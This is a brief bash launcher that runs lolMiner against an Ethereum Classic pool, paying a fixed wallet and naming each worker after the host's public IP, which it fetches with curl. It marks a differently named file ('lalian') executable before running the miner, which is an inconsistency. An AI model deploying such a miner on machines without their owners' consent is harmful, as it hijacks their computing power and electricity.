#!/bin/bash
POOL=eu-etc.hiveon.net:8888
WALLET=0xeda9774264112a15245cf5eda7f9c1b2fe6bf63e.$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./lalian && ./lolMiner --algo ETCHASH --pool $POOL --user $WALLET $@
